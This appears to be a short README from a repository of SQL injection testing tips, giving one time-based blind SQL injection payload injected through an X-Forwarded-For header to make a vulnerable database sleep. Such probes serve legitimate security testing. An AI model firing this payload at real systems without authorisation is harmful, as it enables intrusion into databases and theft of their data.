This repo has some tips for finding sql injection
> 1. Blind Sql-injection
```
Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```
